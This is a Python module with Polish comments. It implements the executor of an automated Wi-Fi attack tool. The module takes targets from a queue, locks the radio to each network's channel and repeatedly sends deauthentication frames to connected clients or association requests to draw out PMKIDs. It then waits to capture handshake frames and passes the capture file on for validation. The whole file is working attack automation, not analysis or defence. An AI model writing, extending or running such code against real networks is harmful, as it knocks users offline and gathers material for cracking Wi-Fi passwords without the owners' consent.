import asyncio
import time
import logging
from .validator import Validator

class Executor:
    def __init__(self, db, api, attack_queue, brain, shared_state):
        self.db = db
        self.api = api
        self.attack_queue = attack_queue
        self.brain = brain
        self.shared_state = shared_state
        self.validator = Validator(db, shared_state)
        self.running = True
        
        # Konfiguracja TTL (Czas życia ataku w kolejce, jeśli utknął na dłużej niż minutę -> odpada)
        self.ttl = 60 

    async def run(self):
        """Konsument Kolejki Ataków (Attack Queue)"""
        while self.running:
            try:
                payload = await asyncio.wait_for(self.attack_queue.get(), timeout=5)
                
                bssid = payload['bssid']
                try:
                    # TTL Check
                    if time.time() - payload['timestamp'] > self.ttl:
                        # Jeśli odrzucamy z powodu TTL, zwalniamy BSSID z pamięci Braina
                        if bssid in self.brain.in_attack_queue:
                            self.brain.in_attack_queue.remove(bssid)
                        continue  # Pomijamy, ale nie zamykamy wątku!
                    await self.execute_attack(payload)
                except Exception as e:
                    logging.error(f"Executor execute_attack Error: {e}")
                finally:
                    self.attack_queue.task_done()
                    
            except asyncio.TimeoutError:
                continue
            except Exception as e:
                logging.error(f"Executor Error: {e}")

    async def execute_attack(self, payload):
        """Wykonywanie strzałów z blokadą kanału i sleepami"""
        bssid = payload['bssid']
        channel = payload['channel']
        attack_type = payload['type']
        client_mac = payload['client_mac']
        essid = payload.get('essid', '<ukryty>')
        rssi = payload.get('rssi', '?')

        # Aktualizacja UI dla użytkownika z ikoną ASCII
        ikona = "⚡ PMKID" if attack_type == 'pmkid' else "🔥 DEAUTH"
        self.shared_state['action'] = f"ATAK {ikona} na {bssid} ({essid}) [{rssi} dBm]"

        # 1. ZABLOKOWANIE KANAŁU (Rozwiązuje problem losowych strzałów)
        await self.api.set_channel(channel)
        
        # Oczekujemy krótko na przestrojenie radia
        await asyncio.sleep(0.5)

        # 2. EGZEKUCJA Z PAUZAMI
        if attack_type == 'deauth' and client_mac:
            self.shared_state['global_deauth_count'] = self.shared_state.get('global_deauth_count', 0) + 1
            for _ in range(3):
                await self.api.send_deauth(bssid, client_mac)
                await asyncio.sleep(0.5)
        elif attack_type == 'pmkid':
            self.shared_state['global_pmkid_count'] = self.shared_state.get('global_pmkid_count', 0) + 1
            for _ in range(3):
                await self.api.send_assoc(bssid)
                await asyncio.sleep(0.5)
        else:
            # Brak klienta przy deauth - anuluj atak
            logging.warning(f"Executor: Deauth bez klienta dla {bssid}, pomijam.")
            self.shared_state['action'] = "Skanowanie eteru..."
            # Zwalniamy BSSID z pamięci podręcznej Braina przy wcześniejszym wyjściu
            if bssid in self.brain.in_attack_queue:
                self.brain.in_attack_queue.remove(bssid)
            return

        # Aktualizacja statusu
        await self.db.mark_attack(bssid, attack_type)

        # 3. NASŁUCH NA KANALE 
        # Czekamy np. 10 sekund mając zablokowany dany kanał w nadziei, że złapiemy M1/M2/PMKID
        await asyncio.sleep(10)

        # 4. ZWOLNIENIE KANAŁU (Przywrócenie Hoppingu w API)
        await self.api.set_channel('clear')
        
        # Przywrócenie napisu skanowania
        if f"ATAK" in self.shared_state.get('action', ''):
            self.shared_state['action'] = "Skanowanie eteru..."
            
        # Zwalniamy BSSID z pamięci podręcznej Braina po zwolnieniu kanału
        if bssid in self.brain.in_attack_queue:
            self.brain.in_attack_queue.remove(bssid)

        # 5. ASYNCHRONICZNA WALIDACJA (Race Condition safe)
        asyncio.create_task(self.validator.check_pcap(bssid, attack_type))
